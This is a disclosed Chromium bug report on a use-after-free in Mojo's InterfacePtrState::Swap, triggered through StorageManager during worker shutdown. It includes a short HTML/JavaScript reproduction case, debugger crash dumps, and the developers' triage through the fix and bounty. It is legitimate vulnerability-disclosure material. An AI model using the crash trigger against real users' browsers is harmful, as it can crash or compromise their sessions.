# Security: Storage Manager - Memory corruption in mojo::internal::InterfacePtrState::Swap()

| Field | Value |
|-------|-------|
| **Issue ID** | [40085978](https://issues.chromium.org/issues/40085978) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Internals>Mojo |
| **Reporter** | lo...@gmail.com |
| **Assignee** | ro...@chromium.org |
| **Created** | 2016-11-17 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1. Open Swap_repro.html in  Chrome browser.  
2. Chrome crashes in mojo::internal::InterfacePtrState::Swap() by accessing arbitrary memory.  

	(1964.adc): Access violation - code c0000005 (!!! second chance !!!)  
	eax=5f9a1888 ebx=00000000 ecx=0833edac edx=5ad14402 esi=0833edac edi=5f9a1888  
	eip=59574f3d esp=0833ed70 ebp=0833ed74 iopl=0         nv up ei pl zr na pe nc  
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
	chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::{ctor}+0x6 [inlined in chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::operator=+0x9]:  

```

**VERSION**  

Chrome Version: Chromium 56.0.2921.0 (Developer Build) (32-bit)  

( <https://www.googleapis.com/download/storage/v1/b/chromium-browser-syzyasan/o/win32-release%2Fasan-win32-release-432168.zip?generation=1479232289559000&alt=media> )  

Operating System: Windows 10

**REPRODUCTION CASE** (Swap\_repro.html)  

<html><script>  

var blob = new Blob(["self.navigator.storage.persisted().then(function(e){ close();self.navigator.storage.persisted();}).catch(function(err){})"],{type: "text/javascript"});  

var worker1 = new Worker(window.URL.createObjectURL(blob));  

</script></html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(1964.adc): Access violation - code c0000005 (!!! second chance !!!)  
eax=5f9a1888 ebx=00000000 ecx=0833edac edx=5ad14402 esi=0833edac edi=5f9a1888  
eip=59574f3d esp=0833ed70 ebp=0833ed74 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::{ctor}+0x6 [inlined in chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::operator=+0x9]:  
59574f3d 8b10            mov     edx,dword ptr [eax]  ds:002b:5f9a1888=????????  
2:035> .exr  
Numeric expression missing from '<EOL>'  
2:035> .exr -1  
ExceptionAddress: 59574f3d (chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::{ctor}+0x00000006)  
   ExceptionCode: c0000005 (Access violation)  
  ExceptionFlags: 00000000  
NumberParameters: 2  
   Parameter[0]: 00000000  
   Parameter[1]: 5f9a1888  
Attempt to read from address 5f9a1888  



-------- -------- -------- chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::{ctor}+0x6 [c:\b\c\b\win_syzyasan_lkgr\src\base\memory\ref_counted.h @ 296]  
5f9a1888 5f9a1888 0833edac chrome_child!scoped_refptr<mojo::internal::MultiplexRouter>::operator=(class scoped_refptr<mojo::internal::MultiplexRouter> \* r = 0x5f9a1888)+0x9 [c:\b\c\b\win_syzyasan_lkgr\src\base\memory\ref_counted.h @ 344]  
0833edac 5f9a1888 075c60b8 chrome_child!std::swap<scoped_refptr<mojo::internal::MultiplexRouter>,void>(class scoped_refptr<mojo::internal::MultiplexRouter> \* _Left = 0x0833edac, class scoped_refptr<mojo::internal::MultiplexRouter> \* _Right = 0x5f9a1888)+0x16 [c:\b\depot_tools\win_toolchain\vs_files\d5dc33b15d1b2c086f2f6632e2fd15882f80dbd3\vc\include\utility @ 51]  
0833edac 00000000 00000000 chrome_child!mojo::internal::InterfacePtrState<device::mojom::blink::WakeLockService,1>::Swap(class mojo::internal::InterfacePtrState<device::mojom::blink::WakeLockService,1> \* other = 0x0833edac)+0x11 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\interface_ptr_state.h @ 264]  
076688f8 07668900 0833ede4 chrome_child!mojo::InterfacePtr<blink::mojom::PresentationService>::reset(void)+0x23 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\interface_ptr.h @ 131]  
-------- -------- -------- chrome_child!base::internal::Invoker<base::internal::BindState<void +0x10 [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 361]  
076688e8 00000000 0833ee1c chrome_child!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x076688e8)+0x13 [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 339]  
075c6058 00000000 07673038 chrome_child!base::internal::RunMixin<base::Callback<void __cdecl(void)+0x16 [c:\b\c\b\win_syzyasan_lkgr\src\base\callback.h @ 64]  
075c843c 075c8378 00000000 chrome_child!mojo::InterfaceEndpointClient::NotifyError(void)+0x45 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 292]  
07673038 00000002 07ac2fe0 chrome_child!mojo::internal::MultiplexRouter::ProcessNotifyErrorTask(struct mojo::internal::MultiplexRouter::Task \* task = 0x07673038, mojo::internal::MultiplexRouter::ClientCallBehavior client_call_behavior = ALLOW_DIRECT_CLIENT_CALLS (0n2), class base::SingleThreadTaskRunner \* current_task_runner = 0x07ac2fe0)+0x3e [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\multiplex_router.cc @ 742]  
00000002 07ac2fe0 075c83a8 chrome_child!mojo::internal::MultiplexRouter::ProcessTasks(mojo::internal::MultiplexRouter::ClientCallBehavior client_call_behavior = ALLOW_DIRECT_CLIENT_CALLS (0n2), class base::SingleThreadTaskRunner \* current_task_runner = 0x07ac2fe0)+0xb3 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\multiplex_router.cc @ 657]  
07668988 00000000 0833eeb0 chrome_child!mojo::internal::MultiplexRouter::OnPipeConnectionError(void)+0xa2 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\multiplex_router.cc @ 632]  
00000000 04f5cda0 00000000 chrome_child!base::internal::RunMixin<base::Callback<void __cdecl(void)+0x16 [c:\b\c\b\win_syzyasan_lkgr\src\base\callback.h @ 64]  
00000001 00000000 00000000 chrome_child!mojo::Connector::HandleError(bool force_pipe_reset = true, bool force_async_handler = false)+0xba [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\connector.cc @ 321]  
0000000a 0833eee4 5aebbaf1 chrome_child!mojo::Connector::OnHandleReadyInternal(unsigned int result = 0xa)+0x20 [c:\b\c\b\win_syzyasan_lkgr\src\mojo\public\cpp\bindings\lib\connector.cc @ 203]  
-------- -------- -------- chrome_child!base::internal::FunctorTraits<void +0xe [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 214]  
-------- -------- -------- chrome_child!base::internal::InvokeHelper<0,void>::MakeItSo+0xe [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 285]  
-------- -------- -------- chrome_child!base::internal::Invoker<base::internal::BindState<void +0xe [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 361]  
076730d8 0833eeec 00000000 chrome_child!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x076730d8, int \* <unbound_args_0> = 0x0833eeec)+0x11 [c:\b\c\b\win_syzyasan_lkgr\src\base\bind_internal.h @ 343]  
0000000a 076730d8 0833ef04 chrome_child!base::internal::RunMixin<base::Callback<void __cdecl(webrtc::MediaStreamTrackInterface::TrackState <args_0> = 0n10 (No matching enumerant))+0x1a [c:\b\c\b\win_syzyasan_lkgr\src\base\callback.h @ 64]  

```

## Attachments

- [Swap_repro.html](attachments/Swap_repro.html) (text/plain, 268 B)

## Timeline

### ke...@chromium.org (2016-11-18)

I used the ASAN build and I cannot reproduce this. Can you please verify that the correct reproduction case is attached?

### lo...@gmail.com (2016-11-18)

Yes, just downloaded Swap_repro.html from here and confirmed it's the correct reproduction case. 

In Windows 32 bit asan build and non asan build, it gets instant crash. In 64 bit Linux ASAN build, I need to refresh it a couple of times to get it triggered.

### lo...@gmail.com (2016-11-19)

It's still reproducible in today's build. In today's build, ran the exact same test case, I got:

Chromium	57.0.2925.0 (Developer Build) (32-bit)
Revision	3ffa4763a6a442e26f1ea2a87ee2bf3f0aa26e1b-refs/heads/master@{#433191}
OS	Windows 10

https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release%2Fasan-win32-release-433191.zip?generation=1479490826847197&alt=media


(16c8.3218): Access violation - code c0000005 (!!! second chance !!!)
eax=0188fe00 ebx=0cfc1888 ecx=0cfc1800 edx=00000000 esi=019f8311 edi=0c47f470
eip=111c9234 esp=0c47f444 ebp=0c47f454 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
chrome_child!scoped_refptr+0x1f [inlined in chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+0x4e]:
111c9234 8b03            mov     eax,dword ptr [ebx]  ds:002b:0cfc1888=????????

5:076> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWoW64\KERNEL32.DLL - 
***** OS (WOW64 kernel32) symbols are WRONG. Please fix symbols to do analysis.

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWoW64\ole32.dll - 

************* Symbol Loading Error Summary **************
Module name            Error
ole32                  The PDB file is no longer available : srv*e:\code\symbols*http://msdl.microsoft.com/download/symbols
                       The PDB file is no longer available : srv*e:\code\symbols*http://chromium-browser-symsrv.commondatastorage.googleapis.com

You can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded.
You should also verify that your symbol search path (.sympath) is correct.
*** WARNING: Unable to verify checksum for E:\ChromeBuilds\asan-win32-release-433191\chrome.dll

FAULTING_IP: 
chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+4e [C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\interface_ptr_state.h @ 261]
111c9234 8b03            mov     eax,dword ptr [ebx]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 111c9234 (chrome_child!scoped_refptr+0x0000001f)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 0cfc1888
Attempt to read from address 0cfc1888

CONTEXT:  00000000 -- (.cxr 0x0;r)
eax=0188fe00 ebx=0cfc1888 ecx=0cfc1800 edx=00000000 esi=019f8311 edi=0c47f470
eip=111c9234 esp=0c47f444 ebp=0c47f454 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
chrome_child!scoped_refptr+0x1f [inlined in chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+0x4e]:
111c9234 8b03            mov     eax,dword ptr [ebx]  ds:002b:0cfc1888=????????

FAULTING_THREAD:  00003218

DEFAULT_BUCKET_ID:  WRONG_SYMBOLS

PROCESS_NAME:  chrome.exe

ADDITIONAL_DEBUG_TEXT:  
You can run '.symfix; .reload' to try to fix the symbol path and load symbols.

MODULE_NAME: chrome_child

FAULTING_MODULE: 77170000 KERNEL32

DEBUG_FLR_IMAGE_TIMESTAMP:  582f3ac2

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  0cfc1888

READ_ADDRESS:  0cfc1888 

FOLLOWUP_IP: 
chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+4e [C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\interface_ptr_state.h @ 261]
111c9234 8b03            mov     eax,dword ptr [ebx]

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

APP:  chrome.exe

ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre

PRIMARY_PROBLEM_CLASS:  WRONG_SYMBOLS

BUGCHECK_STR:  APPLICATION_FAULT_WRONG_SYMBOLS

LAST_CONTROL_TRANSFER:  from 1d51a127 to 111c9234

STACK_TEXT:  
0c47f454 1d51a127 0c47f470 41b58ab3 2424dccb chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+0x4e
0c47f514 157bca07 035ad590 41b58ab3 222513c6 chrome_child!blink::StorageManager::permissionServiceConnectionError+0xa1
0c47f638 157a6aa5 0c47f700 035b0a54 00000000 chrome_child!mojo::InterfaceEndpointClient::NotifyError+0x223
0c47f64c 157a24d1 035b0a40 00000002 03e10dc0 chrome_child!mojo::internal::MultiplexRouter::ProcessNotifyErrorTask+0xc5
0c47f7b0 157a0143 00000002 03e10dc0 41b58ab3 chrome_child!mojo::internal::MultiplexRouter::ProcessTasks+0x353
0c47f854 157b7ab0 035ad4a0 41b58ab3 2224f309 chrome_child!mojo::internal::MultiplexRouter::OnPipeConnectionError+0x3cf
0c47f910 157b8bf1 00000001 00000000 41b58ab3 chrome_child!mojo::Connector::HandleError+0x384
0c47f9b8 195736a1 0000000a 0c47fa20 0188ff40 chrome_child!mojo::Connector::OnHandleReadyInternal+0x8f
0c47f9d0 157e5b74 035ad560 0c47f9f0 41b58ab3 chrome_child!base::internal::Invoker<base::internal::BindState<void (jingle_glue::FakeSSLClientSocket::*)(int) __attribute__((thiscall)),base::internal::UnretainedWrapper<jingle_glue::FakeSSLClientSocket> >,void (int)>::Run+0x47
0c47fa84 157e5d17 0000000a 0c47fb00 03970fd4 chrome_child!mojo::Watcher::OnHandleReady+0x172
0c47fa98 155af79b 41b58ab3 22207e7d 155af3f0 chrome_child!mojo::Watcher::MessageLoopObserver::WillDestroyCurrentMessageLoop+0x6f
0c47fba8 155acb0b 0c47fc60 0c47fcd8 1558a0d5 chrome_child!base::MessageLoop::~MessageLoop+0x3ab
0c47fbb4 1558a0d5 00000001 41b58ab3 22204354 chrome_child!base::MessageLoop::~MessageLoop+0xb
0c47fcd8 155133c9 41b58ab3 221ee255 15513200 chrome_child!base::Thread::ThreadMain+0x4c5
0c47fd7c 008261be 03968910 008213f0 008213f0 chrome_child!base::`anonymous namespace'::ThreadFunc+0x1c9
0c47fd90 0082140e 00003218 00000000 0c47fdb4 chrome!__asan::AsanThread::ThreadStart+0x8e
0c47fda0 77186394 0c1a0000 77186370 11613efc chrome!asan_thread_start+0x1e
WARNING: Stack unwind information not available. Following frames may be wrong.
0c47fdb4 77b602fb 0c1a0000 118597ad 00000000 KERNEL32!BaseThreadInitThunk+0x24
0c47fdfc 77b602cb ffffffff 77b83b67 00000000 ntdll!__RtlUserThreadStart+0x2f
0c47fe0c 00000000 008213f0 0c1a0000 00000000 ntdll!_RtlUserThreadStart+0x1b


STACK_COMMAND:  .cxr 0x0 ; kb

FAULTING_SOURCE_LINE:  C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\interface_ptr_state.h

FAULTING_SOURCE_FILE:  C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\interface_ptr_state.h

FAULTING_SOURCE_LINE_NUMBER:  261

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  chrome_child!mojo::internal::InterfacePtrState<content::mojom::URLLoaderClient,1>::Swap+4e

FOLLOWUP_NAME:  MachineOwner

IMAGE_NAME:  chrome_child.dll

BUCKET_ID:  WRONG_SYMBOLS

FAILURE_BUCKET_ID:  WRONG_SYMBOLS_c0000005_chrome_child.dll!mojo::internal::InterfacePtrState_content::mojom::URLLoaderClient,1_::Swap

ANALYSIS_SOURCE:  UM

FAILURE_ID_HASH_STRING:  um:wrong_symbols_c0000005_chrome_child.dll!mojo::internal::interfaceptrstate_content::mojom::urlloaderclient,1_::swap

FAILURE_ID_HASH:  {2ff4fcc9-d910-6ce8-a822-17cd509fc6a5}

Followup: MachineOwner
---------


### lo...@gmail.com (2016-11-23)

Do you want me to create a new report?

### ke...@chromium.org (2016-11-23)

Sorry, I should have re-opened this. It's a holiday weekend in the US, so this might be idle for a few days, but hopefully somehow familiar with Mojo can take a look and reproduce.

[Monorail components: Internals>Mojo]

### do...@chromium.org (2016-11-23)

rockot: Can you take a look at this?

### do...@chromium.org (2016-11-23)

Also cc'ing some other Mojo folks.

### ro...@chromium.org (2016-11-23)

It's a UAF in StorageManager during MessageLoop destruction. It is unclear to me how it's possible for this to happen since permissionServiceConnectionError() exists early when Platform::current() is null, and Platform::current() is supposed to be null during MessageLoop destruction.

### do...@chromium.org (2016-11-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-24)

This issue is a security regression. If you are not able to fix this quickly, please revert the change that introduced it.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-11-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### ro...@chromium.org (2016-12-05)

[Empty comment from Monorail migration]

### ro...@chromium.org (2016-12-05)

+haraken@

It appears that testing Platform::current() is not sufficient to avoid this crash, since WorkerThread shutdown may also trigger the error callback after the thread-local Permissions object has been invalidated.

Do you have any suggestions for a more general solution, since this is no longer just a problem with process shutdown?

### ro...@chromium.org (2016-12-05)

Upon some additional inspection and some local runs of chrome and content_shell hitting other DCHECKs, I suspect it may be considered a bug that there are any persistents still alive on a worker thread while it's being shut down. Is that right?

### ha...@chromium.org (2016-12-06)

Do you mean you're hitting this assert?

https://cs.chromium.org/chromium/src/third_party/WebKit/Source/platform/heap/ThreadState.cpp?q=threadstate.cpp&sq=package:chromium&dr&l=320


### ro...@chromium.org (2016-12-06)

Yes, that's the one

### ha...@chromium.org (2016-12-06)

That means that we need to remove the persistent handle before shutting down the worker.


### ro...@chromium.org (2016-12-06)

So how do we go about doing that? Sorry, I am not very familiar with either workers or Blink heap.

### ha...@chromium.org (2016-12-07)

[Empty comment from Monorail migration]

### bu...@google.com (2016-12-08)

Moving to ReleaseBlock-Stable so this still gets tracked in the milestone

### ro...@chromium.org (2016-12-16)

Ping haraken@, could you please clarify your proposal in #19?

### ha...@chromium.org (2016-12-17)

I mean we first need to identify what persistent handle is leaking (i.e., not cleared before worker shuts down).

Do you know what CL caused the leak?



### sh...@chromium.org (2016-12-31)

rockot: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2017-01-13)

what are the next steps here?

### sh...@chromium.org (2017-01-15)

rockot: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-01-16)

We commit ourselves to a 60 day deadline for fixing for high severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ro...@chromium.org (2017-01-17)

Doh. My last reply (via e-mail) apparently never made it into this bug. Weird.

This should be fixed on ToT because we no longer attempt clean shutdown of render processes. I'm not sure how realistic it is to merge that behavior to M56. haraken@?

### ha...@chromium.org (2017-01-17)

I think it's a bit too risky to merge that change :/


### aw...@chromium.org (2017-01-20)

Ok, that is a big change for a merge at this point.  Do you know if it made 57?

### cl...@chromium.org (2017-01-31)

ClusterFuzz testcase 5808942002470912 is verified as fixed, so closing issue.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-01-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-04)

Your change meets the bar and is auto-approved for M57. Please go ahead and merge the CL to branch 2987 manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), ketakid@(cros), govind@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2017-02-06)

Please merge your change to M57 branch 2987 before 5:00 PM PT, Monday (02/06/) so we can pick it up for next Beta release. Thank you.

### aw...@chromium.org (2017-02-06)

[Empty comment from Monorail migration]

### ro...@chromium.org (2017-02-07)

As covered in comments #29 and #30, this is unrealistic to merge into M56.

The change does not need to be merged into M57 as it landed in r443175, which already made the M57 cut.

### aw...@chromium.org (2017-02-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-13)

Cheers!  The panel decided to award $1,000 for this bug.

### aw...@chromium.org (2017-02-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-05-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-05-09)

This issue was migrated from crbug.com/chromium/666229?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/670929]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085978)*
